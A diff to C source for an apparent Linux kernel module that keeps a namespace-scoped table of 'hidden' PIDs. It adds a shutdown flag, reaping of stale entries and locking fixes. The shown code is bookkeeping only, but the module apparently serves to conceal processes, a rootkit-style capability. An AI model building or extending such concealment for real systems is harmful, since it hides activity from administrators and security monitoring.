@@ -25,6 +25,14 @@ static DEFINE_SPINLOCK(hide_lock);
 static DEFINE_SPINLOCK(hide_ns_lock);
 static int hide_total_count = 0;
 
+/* Set once by memd_hide_clear (module exit): the set is draining and
+ * no new entry may be published. Ioctls stay reachable until proto
+ * cleanup, which runs after the clear, so without this an add racing
+ * the sweep lands in an already-swept bucket and leaks. Checked under
+ * the matching lock so a racing add can neither slip past the sweep
+ * nor leak an ns entry. */
+static int hide_shutdown = 0;
+
 static inline unsigned int hide_hash_fn(pid_t pid, struct pid_namespace *ns)
  {
     return hash_long((unsigned long)pid ^ (unsigned long)ns, MEMD_HIDE_HASH_BITS);
@@ -92,6 +100,14 @@ int memd_hide_add(pid_t pid)
 
     spin_lock_irqsave(&hide_lock, flags);
 
+    if (hide_shutdown) {
+        spin_unlock_irqrestore(&hide_lock, flags);
+        put_pid_ns(ns);
+        kfree(entry);
+        kfree(ns_entry);
+        return -ESHUTDOWN;
+    }
+
     if (hide_find_entry(pid, ns)) {
         spin_unlock_irqrestore(&hide_lock, flags);
         put_pid_ns(ns);
@@ -122,15 +138,17 @@ int memd_hide_add(pid_t pid)
     /* Per-ns count is best-effort status; the entry above owns one ns
      * ref and this path still holds the original, so ns stays alive. */
     spin_lock_irqsave(&hide_ns_lock, flags);
-    found = hide_find_ns(ns);
-    if (found) {
-        found->count++;
-    } else if (ns_entry) {
-        ns_entry->ns = get_pid_ns(ns);
-        ns_entry->count = 1;
-        ns_hash = hash_long((unsigned long)ns, MEMD_HIDE_HASH_BITS);
-        hlist_add_head(&ns_entry->node, &hide_ns_hash[ns_hash]);
-        ns_entry = NULL;
+    if (!hide_shutdown) {
+        found = hide_find_ns(ns);
+        if (found) {
+            found->count++;
+        } else if (ns_entry) {
+            ns_entry->ns = get_pid_ns(ns);
+            ns_entry->count = 1;
+            ns_hash = hash_long((unsigned long)ns, MEMD_HIDE_HASH_BITS);
+            hlist_add_head(&ns_entry->node, &hide_ns_hash[ns_hash]);
+            ns_entry = NULL;
+        }
     }
     spin_unlock_irqrestore(&hide_ns_lock, flags);
     kfree(ns_entry);
@@ -160,6 +178,13 @@ int memd_hide_add_ns(pid_t pid, struct pid_namespace *ns)
 
     spin_lock_irqsave(&hide_lock, flags);
 
+    if (hide_shutdown) {
+        spin_unlock_irqrestore(&hide_lock, flags);
+        kfree(entry);
+        kfree(ns_entry);
+        return -ESHUTDOWN;
+    }
+
     if (hide_find_entry(pid, ns)) {
         spin_unlock_irqrestore(&hide_lock, flags);
         kfree(entry);
@@ -186,19 +211,100 @@ int memd_hide_add_ns(pid_t pid, struct pid_namespace *ns)
     spin_unlock_irqrestore(&hide_lock, flags);
 
     spin_lock_irqsave(&hide_ns_lock, flags);
-    found = hide_find_ns(ns);
-    if (found) {
-        found->count++;
-    } else if (ns_entry) {
-        ns_entry->ns = get_pid_ns(ns);
-        ns_entry->count = 1;
-        ns_hash = hash_long((unsigned long)ns, MEMD_HIDE_HASH_BITS);
-        hlist_add_head(&ns_entry->node, &hide_ns_hash[ns_hash]);
-        ns_entry = NULL;
+    if (!hide_shutdown) {
+        found = hide_find_ns(ns);
+        if (found) {
+            found->count++;
+        } else if (ns_entry) {
+            ns_entry->ns = get_pid_ns(ns);
+            ns_entry->count = 1;
+            ns_hash = hash_long((unsigned long)ns, MEMD_HIDE_HASH_BITS);
+            hlist_add_head(&ns_entry->node, &hide_ns_hash[ns_hash]);
+            ns_entry = NULL;
+        }
     }
     spin_unlock_irqrestore(&hide_ns_lock, flags);
     kfree(ns_entry);
     return 0;
+}
+
+/* Reap entries for a pid whose task is gone (del fallback). An entry
+ * with no live task hides nothing; leaving it would hide a future pid
+ * reuse and pin a slot. Only stale entries are removed, so live
+ * entries for the same numeric pid in other namespaces are untouched.
+ * Returns 0 if anything was reaped, -ESRCH otherwise. */
+static int hide_reap_stale(pid_t pid)
+ {
+    struct memd_hide_entry *cursor;
+    struct memd_hide_entry *victim;
+    struct memd_hide_ns_entry *ns_entry;
+    struct memd_hide_ns_entry *gone;
+    struct pid *pid_struct;
+    struct pid_namespace *entry_ns;
+    struct pid_namespace *gone_ns;
+    struct task_struct *task;
+    unsigned long flags;
+    int reaped;
+    int i;
+
+    reaped = 0;
+    for (i = 0; i < MEMD_HIDE_HASH_SIZE; i++) {
+        for (;;) {
+            victim = NULL;
+            spin_lock_irqsave(&hide_lock, flags);
+            hlist_for_each_entry(cursor, &hide_hash[i], node) {
+                if (cursor->pid != pid)
+                    continue;
+                /* RCU under a spinlock is legal (no sleep): a pure
+                 * pointer chase. A NULL pid_struct never pinned a
+                 * task, so it is stale by definition. */
+                rcu_read_lock();
+                task = cursor->pid_struct ?
+                    pid_task(cursor->pid_struct, PIDTYPE_PID) : NULL;
+                rcu_read_unlock();
+                if (!task) {
+                    victim = cursor;
+                    break;
+                }
+            }
+            if (victim) {
+                hlist_del(&victim->node);
+                hide_total_count--;
+            }
+            spin_unlock_irqrestore(&hide_lock, flags);
+
+            if (!victim)
+                break;
+
+            pid_struct = victim->pid_struct;
+            entry_ns = victim->ns;
+            kfree(victim);
+            if (pid_struct)
+                put_pid(pid_struct);
+
+            gone = NULL;
+            gone_ns = NULL;
+            spin_lock_irqsave(&hide_ns_lock, flags);
+            ns_entry = hide_find_ns(entry_ns);
+            if (ns_entry) {
+                ns_entry->count--;
+                if (ns_entry->count <= 0) {
+                    hlist_del(&ns_entry->node);
+                    gone = ns_entry;
+                    gone_ns = ns_entry->ns;
+                }
+            }
+            spin_unlock_irqrestore(&hide_ns_lock, flags);
+
+            if (gone)
+                kfree(gone);
+            if (gone_ns)
+                put_pid_ns(gone_ns);
+            put_pid_ns(entry_ns);
+            reaped++;
+        }
+    }
+    return reaped ? 0 : -ESRCH;
 }
 
 int memd_hide_del(pid_t pid)
@@ -220,7 +326,11 @@ int memd_hide_del(pid_t pid)
     task = find_task_by_vpid(pid);
     if (!task) {
         rcu_read_unlock();
-        return -ESRCH;
+        /* Subject is gone: the scoped entry (if any) is stale. Reap
+         * it so a future pid reuse does not inherit the hide and the
+         * slot does not leak; live entries in other namespaces are
+         * left alone. */
+        return hide_reap_stale(pid);
     }
     /* No task->pid_ns member exists upstream; the active namespace
      * (nsproxy->pid_ns_for_children) is the scoping equivalent. */
@@ -228,7 +338,7 @@ int memd_hide_del(pid_t pid)
     rcu_read_unlock();
 
     if (!ns)
-        return -ESRCH;
+        return hide_reap_stale(pid);
 
     spin_lock_irqsave(&hide_lock, flags);
 
@@ -285,6 +395,13 @@ void memd_hide_clear(void)
     struct pid_namespace *gone_ns;
     unsigned long flags;
     int i;
+
+    /* Freeze adds first (under hide_lock): any add that published
+     * before this is still ahead of the sweep and will be popped;
+     * any add after it fails closed. */
+    spin_lock_irqsave(&hide_lock, flags);
+    hide_shutdown = 1;
+    spin_unlock_irqrestore(&hide_lock, flags);
 
     /* Pop one entry at a time: unlink under the lock, drop refs after
      * (put_pid/put_pid_ns may free and must not run under a spinlock). */
